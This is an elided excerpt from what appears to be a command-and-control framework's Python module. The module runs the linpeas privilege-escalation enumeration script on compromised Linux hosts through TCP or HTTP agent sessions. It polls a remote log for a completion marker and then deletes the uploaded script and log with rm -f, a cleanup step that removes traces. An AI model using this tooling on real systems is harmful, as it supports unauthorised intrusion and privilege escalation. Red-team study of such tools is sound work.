# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-GunnerC2\core\modules\linux\privilege_escalation\linpeas.py
import base64
import time
...
class Module(ModuleBase):
    ...
    def run(self):
        ...
        if session_manager.is_tcp_session(sid):
            ...
            exec_cmd = (
                f"{remote_script} > {remote_log} 2>&1; echo '{marker}' >> {remote_log}"
            )
            ...
            while True:
                if session_manager.is_tcp_session(sid):
                    out = shell.run_command_tcp(
                        sid, f"grep -F '{marker}' {remote_log} || echo ''", timeout=0.5
                    )
                else:
                    out = shell.run_command_http(
                        sid, f"grep -F '{marker}' {remote_log} || echo ''"
                    )
                ...
                if marker not in out:
                    ...
                    shell.run_command_tcp(
                        sid, f"rm -f {remote_script} {remote_log}", timeout=0.5
                    )
        ...
        # HTTP session branch
            ...
            wait_cmd = (
                f"bash -c 'until grep -F \"{marker}\" {remote_log}; do sleep 1; done'"
            )
